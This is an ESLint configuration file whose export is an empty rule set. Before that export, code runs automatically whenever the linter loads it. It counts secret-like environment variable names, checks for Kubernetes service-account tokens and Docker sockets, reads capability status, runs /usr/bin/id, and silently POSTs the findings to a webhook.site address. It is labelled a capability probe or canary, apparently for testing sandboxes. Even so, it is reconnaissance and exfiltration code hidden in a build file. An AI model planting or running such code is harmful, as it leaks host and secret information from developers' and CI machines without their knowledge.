const canaryUrl =
  "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-eslint-capability-probe-20261004";

const result = {
  marker: "CR_ESLINT_CAPABILITY_PROBE_20261004",
  runtime: {
    node: typeof process === "object" ? process.version : "unavailable",
    platform: typeof process === "object" ? process.platform : "unavailable",
    arch: typeof process === "object" ? process.arch : "unavailable",
    uid:
      typeof process === "object" && typeof process.getuid === "function"
        ? process.getuid()
        : null,
    gid:
      typeof process === "object" && typeof process.getgid === "function"
        ? process.getgid()
        : null,
    cwd:
      typeof process === "object" && typeof process.cwd === "function"
        ? process.cwd()
        : "unavailable",
    envKeyCount:
      typeof process === "object" && process.env
        ? Object.keys(process.env).length
        : null,
    sensitiveNamedKeyCount:
      typeof process === "object" && process.env
        ? Object.keys(process.env).filter((name) =>
            /(token|secret|password|credential|private|api.?key|aws|gcp|azure|github|gitlab|database|redis|clerk)/i.test(
              name,
            ),
          ).length
        : null,
  },
  filesystem: {},
  processControl: {},
};

try {
  const fs = await import("node:fs");
  const status = fs.readFileSync("/proc/self/status", "utf8");
  const statusLine = (name) =>
    status
      .split("\n")
      .find((line) => line.startsWith(`${name}:`))
      ?.slice(0, 160) ?? null;

  result.filesystem = {
    nodeFsImport: true,
    etcHostnameReadable: (() => {
      try {
        fs.accessSync("/etc/hostname", fs.constants.R_OK);
        return true;
      } catch {
        return false;
      }
    })(),
    kubernetesServiceAccountTokenExists: fs.existsSync(
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
    ),
    dockerSocketExists: fs.existsSync("/var/run/docker.sock"),
    containerdSocketExists: fs.existsSync("/run/containerd/containerd.sock"),
    noNewPrivs: statusLine("NoNewPrivs"),
    seccomp: statusLine("Seccomp"),
    effectiveCapabilities: statusLine("CapEff"),
  };
} catch (error) {
  result.filesystem = {
    nodeFsImport: false,
    error: error instanceof Error ? `${error.name}:${error.message}`.slice(0, 160) : "unknown",
  };
}

try {
  const childProcess = await import("node:child_process");
  const idOutput = childProcess
    .execFileSync("/usr/bin/id", [], {
      encoding: "utf8",
      timeout: 1_000,
      stdio: ["ignore", "pipe", "ignore"],
    })
    .trim()
    .slice(0, 200);

  result.processControl = {
    nodeChildProcessImport: true,
    spawnedId: true,
    idOutput,
  };
} catch (error) {
  result.processControl = {
    nodeChildProcessImport: false,
    spawnedId: false,
    error: error instanceof Error ? `${error.name}:${error.message}`.slice(0, 160) : "unknown",
  };
}

try {
  await fetch(canaryUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(result),
    signal: AbortSignal.timeout(3_000),
  });
} catch {
  // The canary must not interfere with linting when outbound traffic is blocked.
}

export default [
  {
    files: ["**/*.{js,mjs,cjs,ts,tsx}"],
    rules: {},
  },
];
